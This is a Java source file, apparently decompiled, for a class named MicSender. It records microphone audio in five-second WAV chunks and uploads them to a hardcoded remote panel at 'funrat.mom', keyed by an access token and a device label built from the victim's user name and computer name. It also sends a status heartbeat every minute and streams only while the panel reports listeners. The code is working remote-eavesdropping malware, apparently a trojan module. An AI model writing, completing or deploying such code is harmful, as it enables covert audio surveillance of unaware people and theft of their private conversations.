package com.example.mic;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.UUID;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Mixer;
import javax.sound.sampled.TargetDataLine;
import javax.sound.sampled.Mixer.Info;

public class MicSender {
   private static final AudioFormat FORMAT = new AudioFormat(44100.0F, 16, 1, true, false);
   private static final int CHUNK_SECONDS = 5;
   private static final int CHUNK_BYTES = (int)(FORMAT.getSampleRate() * FORMAT.getSampleSizeInBits() / 8.0F * FORMAT.getChannels() * 5.0F);
   private static volatile boolean running;
   private static volatile boolean listeners = false;
   private static String accessKey = "098cf3c1-2b8c-4094-82c2-388699660f90";
   private static String panelHost = "funrat.mom";
   private static int micIndex = -1;
   private static final String DEVICE = resolveDevice();

   private static String resolveDevice() {
      String prop = System.getProperty("screen.device.name");
      if (prop != null && !prop.trim().isEmpty()) {
         return prop.trim();
      }

      String env = System.getenv("SCREEN_DEVICE_NAME");
      if (env != null && !env.trim().isEmpty()) {
         return env.trim();
      }

      String user = System.getProperty("user.name");
      String host = System.getenv("COMPUTERNAME");
      if (user == null || user.trim().isEmpty()) {
         user = "user";
      }

      if (host == null || host.trim().isEmpty()) {
         host = "host";
      }

      return user + "@" + host;
   }

   public static void main(String[] args) throws Exception {
      if (args.length > 0 && args[0] != null && !args[0].trim().isEmpty()) {
         accessKey = args[0];
      }

      if (args.length > 1) {
         try {
            micIndex = Integer.parseInt(args[1]);
         } catch (Exception var5) {
         }
      }

      if (args.length > 2 && args[2] != null && !args[2].trim().isEmpty()) {
         panelHost = args[2].trim();
      }

      int devices = listMics();
      boolean hasMic = devices > 0;
      System.out.println("Microphones found: " + devices + " -> https://" + panelHost);
      reportStatus("init", devices, false, null);
      if (!hasMic) {
         reportStatus("no_mic", 0, false, "no microphone devices found");
         System.out.println("No microphone found, capture not started.");
      } else {
         if (micIndex < 0) {
            micIndex = 0;
         }

         running = true;
         Runtime.getRuntime().addShutdownHook(new Thread(() -> running = false));
         int devCount = devices;
         Thread hb = new Thread(() -> {
            while (running) {
               reportStatus("capturing", devCount, true, null);

               try {
                  Thread.sleep(60000L);
               } catch (InterruptedException e) {
                  return;
               }
            }
         });
         hb.setDaemon(true);
         hb.start();
         captureAndSend();
      }
   }

   private static int listMics() {
      int usable = 0;

      try {
         Info[] mixers = AudioSystem.getMixerInfo();
         System.out.println("Available microphones:");
         int idx = 0;

         for (Info mi : mixers) {
            Mixer m = AudioSystem.getMixer(mi);

            try {
               if (m.getTargetLineInfo().length > 0) {
                  System.out.println("  [" + idx + "] " + mi.getName() + " (" + mi.getDescription() + ")");
                  usable++;
               }
            } catch (Exception var9) {
            }

            idx++;
         }
      } catch (Exception var10) {
      }

      return usable;
   }

   private static void captureAndSend() {
      TargetDataLine line = null;

      try {
         if (micIndex >= 0) {
            Info[] mixers = AudioSystem.getMixerInfo();
            int idx = 0;

            for (Info mi : mixers) {
               if (idx == micIndex) {
                  Mixer m = AudioSystem.getMixer(mi);
                  javax.sound.sampled.DataLine.Info info = new javax.sound.sampled.DataLine.Info(TargetDataLine.class, FORMAT);
                  if (m.isLineSupported(info)) {
                     line = (TargetDataLine)m.getLine(info);
                  } else {
                     System.err.println("Mic not supported, using default");
                  }
                  break;
               }

               idx++;
            }
         }

         if (line == null) {
            javax.sound.sampled.DataLine.Info info = new javax.sound.sampled.DataLine.Info(TargetDataLine.class, FORMAT);
            line = (TargetDataLine)AudioSystem.getLine(info);
         }

         line.open(FORMAT, CHUNK_BYTES * 2);
         line.start();
         byte[] buf = new byte[CHUNK_BYTES];

         while (running) {
            int read = line.read(buf, 0, buf.length);
            if (read > 0 && listeners) {
               byte[] chunk = read < buf.length ? Arrays.copyOf(buf, read) : (byte[])buf.clone();
               sendChunk(chunk);
            }
         }
      } catch (Exception e) {
         running = false;
         System.err.println("Mic error: " + e.getMessage());
         reportStatus("error", 0, false, e.getMessage());
      } finally {
         if (line != null) {
            line.stop();
            line.close();
         }
      }
   }

   private static void sendChunk(byte[] audioData) {
      try {
         ByteArrayOutputStream wav = new ByteArrayOutputStream();
         writeWavHeader(wav, audioData.length);
         wav.write(audioData);
         byte[] wavBytes = wav.toByteArray();
         String boundary = "----Mic" + UUID.randomUUID().toString().replace("-", "");
         URL url = new URL(
            "https://" + panelHost + "/api/mic/upload?key=" + URLEncoder.encode(accessKey, "UTF-8") + "&device=" + URLEncoder.encode(DEVICE, "UTF-8")
         );
         HttpURLConnection c = (HttpURLConnection)url.openConnection();
         c.setRequestMethod("POST");
         c.setDoOutput(true);
         c.setConnectTimeout(15000);
         c.setReadTimeout(30000);
         c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
         OutputStream out = c.getOutputStream();

         try {
            write(out, "--" + boundary + "\r\n");
            write(out, "Content-Disposition: form-data; name=\"audio\"; filename=\"chunk.wav\"\r\n");
            write(out, "Content-Type: audio/wav\r\n\r\n");
            out.write(wavBytes);
            write(out, "\r\n--" + boundary + "--\r\n");
         } catch (Throwable var10) {
            if (out != null) {
               try {
                  out.close();
               } catch (Throwable var9) {
                  var10.addSuppressed(var9);
               }
            }

            throw var10;
         }

         if (out != null) {
            out.close();
         }

         int code = c.getResponseCode();
         if (code < 200 || code >= 300) {
            System.err.println("Mic upload HTTP " + code);
         }
      } catch (Exception e) {
         System.err.println("Mic send: " + e.getMessage());
      }
   }

   private static void reportStatus(String state, int devices, boolean capturing, String error) {
      try {
         StringBuilder j = new StringBuilder();
         j.append("{\"state\":\"").append(esc(state)).append("\"");
         j.append(",\"devices\":").append(devices);
         j.append(",\"hasMic\":").append(devices > 0);
         j.append(",\"capturing\":").append(capturing);
         j.append(",\"error\":").append(error == null ? "null" : "\"" + esc(error) + "\"");
         j.append("}");
         URL url = new URL(
            "https://" + panelHost + "/api/mic/status?key=" + URLEncoder.encode(accessKey, "UTF-8") + "&device=" + URLEncoder.encode(DEVICE, "UTF-8")
         );
         HttpURLConnection c = (HttpURLConnection)url.openConnection();
         c.setRequestMethod("POST");
         c.setDoOutput(true);
         c.setConnectTimeout(8000);
         c.setReadTimeout(8000);
         c.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
         OutputStream out = c.getOutputStream();

         try {
            out.write(j.toString().getBytes(StandardCharsets.UTF_8));
         } catch (Throwable var11) {
            if (out != null) {
               try {
                  out.close();
               } catch (Throwable var10) {
                  var11.addSuppressed(var10);
               }
            }

            throw var11;
         }

         if (out != null) {
            out.close();
         }

         String resp = readAll(c.getInputStream());
         listeners = resp != null && resp.contains("\"listeners\":") && !resp.contains("\"listeners\":0");
         c.getResponseCode();
      } catch (Exception var12) {
      }
   }

   private static String readAll(InputStream in) throws IOException {
      ByteArrayOutputStream b = new ByteArrayOutputStream();
      byte[] buf = new byte[256];

      int n;
      while ((n = in.read(buf)) != -1) {
         b.write(buf, 0, n);
      }

      return new String(b.toByteArray(), StandardCharsets.UTF_8);
   }

   private static String esc(String s) {
      return s == null ? "" : s.replace("\\", "\\\\").replace("\"", "\\\"");
   }

   private static void write(OutputStream out, String s) throws IOException {
      out.write(s.getBytes(StandardCharsets.UTF_8));
   }

   private static void writeWavHeader(OutputStream out, int dataSize) throws IOException {
      int totalSize = 36 + dataSize;
      writeLE(out, "RIFF".getBytes());
      writeLEInt(out, totalSize);
      writeLE(out, "WAVE".getBytes());
      writeLE(out, "fmt ".getBytes());
      writeLEInt(out, 16);
      writeLEShort(out, (short)1);
      writeLEShort(out, (short)FORMAT.getChannels());
      writeLEInt(out, (int)FORMAT.getSampleRate());
      writeLEInt(out, (int)(FORMAT.getSampleRate() * FORMAT.getSampleSizeInBits() / 8.0F * FORMAT.getChannels()));
      writeLEShort(out, (short)(FORMAT.getSampleSizeInBits() / 8 * FORMAT.getChannels()));
      writeLEShort(out, (short)FORMAT.getSampleSizeInBits());
      writeLE(out, "data".getBytes());
      writeLEInt(out, dataSize);
   }

   private static void writeLE(OutputStream out, byte[] b) throws IOException {
      out.write(b);
   }

   private static void writeLEInt(OutputStream out, int v) throws IOException {
      out.write(v & 0xFF);
      out.write(v >> 8 & 0xFF);
      out.write(v >> 16 & 0xFF);
      out.write(v >> 24 & 0xFF);
   }

   private static void writeLEShort(OutputStream out, short v) throws IOException {
      out.write(v & 255);
      out.write(v >> 8 & 0xFF);
   }
}
